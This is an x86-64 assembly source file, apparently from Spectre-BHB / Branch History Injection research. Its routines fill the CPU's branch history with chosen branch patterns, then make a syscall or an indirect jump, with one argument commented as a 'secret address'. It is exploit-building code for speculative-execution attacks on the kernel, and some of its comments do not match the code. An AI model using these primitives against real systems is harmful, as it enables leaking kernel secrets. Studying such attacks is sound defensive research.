#define MAX_HISTORY_SIZE 420

.intel_syntax noprefix

.section .text

# The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9
# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ; fill_bhb
# ; - arg 1 - rdi: ptr to history
# ; - arg 2 - rsi: syscall nr
# ; - arg 3 - rdx: syscall arg1
# ; - arg 4 - rcx: syscall arg2
# ; - arg 5 - rcx: syscall arg3
# ; - arg 6 - rcx: syscall arg4
# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.global fill_bhb
.global do_only_syscall
.align 4096
fill_bhb:

    # Perform 256 conditional branches to fill the BHB
    # rdi points to an array of 256 bytes that dictates the direction of
    # all the 256 branches
    .rept MAX_HISTORY_SIZE
        movzx   rax, BYTE PTR [rdi]
        inc     rdi
        cmp     rax, 1
        je      1f
        1:
    .endr
do_only_syscall:


    mov     rax, rsi
    mov     rdx, rdx # RDX  rdx # tfp_arg
    mov     rsi, rcx # RSI  # rcx # secret address
    mov     r8, r8  # R8

    xor rdi, rdi
    xor r9, r9
    xor r10, r10


    push rbx
    push r11
    push r12
    push r13
    push r14
    push r15
    push rbp

    xor rbx, rbx
    xor r11, r11
    xor r12, r12
    xor r13, r13
    xor r14, r14
    xor r15, r15
    xor rbp, rbp

    syscall

    pop rbp
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop rbx

    ret


.global static_fill_bhb_sys
.align 4096
static_fill_bhb_sys:
    # Perform 194 branches to fill the BHB statically
    # next jmp to the location of the 2th argument
    mov     rax, 1
    cmp     rax, 1
    .rept 194
        je      1f
        # Some padding to not stress the BTB
        .rept 3
            .BYTE 0x0f, 0x1f, 0x00
        .endr
        1:
    .endr
    mov     rax, rdi
    mov     rdi, rsi
    mov     rsi, rdx
    mov     rdx, rcx
    mov     r10, r8

    xor r9, r9

    push rbx
    push r11
    push r12
    push r13
    push r14
    push r15
    push rbp

    xor rbx, rbx
    xor r11, r11
    xor r12, r12
    xor r13, r13
    xor r14, r14
    xor r15, r15
    xor rbp, rbp

    syscall

    pop rbp
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop rbx

    ret


.global fill_bhb_call
fill_bhb_call:

    # Perform 256 conditional branches to fill the BHB
    # next jmp to the location of the 2th argument
    .rept MAX_HISTORY_SIZE
        movzx   rax, BYTE PTR [rdi]
        inc     rdi
        cmp     rax, 1
        je      1f
        1:
    .endr
    mov     rax, rsi
    mov     rdi, rdx
    mov     rsi, rcx
    mov     rdx, r8
    mov     rcx, r9
    mov     r8, 0
    mov     r9, 0
    jmp     rax
